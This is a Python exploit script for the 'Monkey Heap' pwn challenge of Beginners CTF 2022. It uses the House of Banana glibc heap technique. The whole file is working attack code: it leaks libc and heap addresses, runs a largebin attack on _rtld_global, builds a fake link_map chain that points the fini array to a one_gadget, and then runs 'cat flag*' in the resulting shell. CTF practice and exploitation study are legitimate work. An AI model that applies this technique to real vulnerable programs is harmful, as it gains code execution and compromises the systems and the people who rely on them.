"""
Monkey Heap - Beginners CTF 2022 Online
Solution with House of Banana

Pros:
- Only one largebin attack required
- Simple to understand
Cons:
- Require exit
- Require address of ld and heap
- Crafting fake link_map chain is complex
"""
from ptrlib import *
import os

HOST = os.getenv("CTF4B_HOST", "monkey.quals.beginners.seccon.jp")
PORT = int(os.getenv("CTF4B_PORT", 9999))

def add(index, size):
    assert size <= 0x600
    sock.sendlineafter("> ", "1")
    sock.sendlineafter(": ", str(index))
    sock.sendlineafter(": ", str(size))
def write(index, data):
    sock.sendlineafter("> ", "2")
    sock.sendlineafter(": ", str(index))
    sock.sendlineafter(": ", data)
def read(index):
    sock.sendlineafter("> ", "3")
    sock.sendlineafter(": ", str(index))
    sock.recvuntil("papyrus: ")
    data = sock.recv()
    if data[-2:] == b'> ':
        data = data[:-2]
        sock.unget("> ")
    return data
def delete(index):
    sock.sendlineafter("> ", "4")
    sock.sendlineafter(": ", str(index))

libc = ELF("./libc.so.6")
sock = Socket(HOST, PORT)

# 1. Leak libc
add(1, 0x548) # victim
add(0, 0x508) # gap
add(2, 0x538)
add(0, 0x508) # gap
add(3, 0x518)
add(0, 0x508) # gap
delete(1)
libc_base = u64(read(1)) - libc.main_arena() - 96
libc.set_base(libc_base)
addr_rtld_global = libc_base + 0x26c040
if True: # with aslr (off by 0x6000 because of vvar+vdso)
    addr_rtld_global -= 0x6000

# 2. Leak heap
add(0, 0x5ff) # link victim to largebin
delete(2)
delete(3)
heap_base = u64(read(3)) - 0xcf0
logger.info("heap = " + hex(heap_base))
addr_fake_map = heap_base + 0xcf0

# 3. Overwrite _ns_loaded (largebin attack)
payload  = p64(0) * 3
payload += p64(addr_rtld_global - 0x20)
write(1, payload)
add(0, 0x518)

# 4. Prepare fake link_map array
# l_addr=prev_size=0, l_name=size
payload  = flat([
    0,
    addr_fake_map + 0x20, # 1: [0]->l_next
    0,
    addr_fake_map,        # 3: [0]->l_real
    0,
    addr_fake_map + 0x28, # 5: [1]->l_next
    addr_fake_map + 0x50, # 6: [2]->l_next
    addr_fake_map + 0x20, # 7: [1]->l_real
    addr_fake_map + 0x28, # 8: [2]->l_real
    0,
    0,
    0,                    # 11: [3]->l_next
    0,
    addr_fake_map + 0x50, # 13: [3]->l_real
    0, 0,
    0, 0, 0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0,
    addr_fake_map + 0x190, # 32: [0]->l_info[DT_FINI_ARRAY]
    0,
    addr_fake_map + 0x128, # 34: [0]->l_info[DT_FINI_ARRAYSZ]
    0,
    8, # 36
    0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0,
    26, # 48: [0]->l_info[DT_FINI_ARRAY]->d_tag
    addr_fake_map + 0x1a0,  # 49: [0]->l_info[DT_FINI_ARRAY]->d_un.d_ptr
    libc_base + 0xebcf1, # 50: function pointer ()
    0,
], map=p64)
payload += b'\x00' * (0x61*8 - len(payload))
payload += p64(0x800000000) # l_init_called = 1
write(2, payload)

# 5. Win
sock.sendlineafter("> ", "5")
sock.sendline("cat flag*")

print(sock.recvuntil("}"))

sock.close()
